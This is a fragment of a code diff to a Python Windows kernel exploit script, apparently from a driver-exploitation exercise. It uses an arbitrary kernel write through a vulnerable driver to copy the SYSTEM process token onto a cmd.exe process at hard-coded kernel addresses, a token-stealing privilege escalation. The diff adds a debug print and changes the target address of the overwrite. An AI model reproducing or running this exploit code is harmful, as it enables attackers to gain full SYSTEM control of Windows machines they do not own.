@@ -332,11 +332,12 @@ def executeOverwrite():
 
         kernelWriteToAnywhere(driver, location_of_system_token, USER_MEM_PAGE_PTR)
         system_token_value = cast(USER_ADDR, POINTER(c_ulonglong))[0]
+        print "Location of SYSTEM_TOKEN is: " + hex(location_of_system_token)
         print "SYSTEM_TOKEN is: " + hex(system_token_value)
 
-                                                          #check the debugger for the cmd memory process
-                                                          !process 0 0 cmd.exe then add 0x358
-        kernelWriteToAnywhere(driver, system_token_value, 0xffff9d0d9a564700+358)
+        
+
+        kernelWriteToAnywhere(driver, location_of_system_token, (0xffff9d0d9d9687c0+358))
 ############################################ RUN ################################################
 
 executeOverwrite()
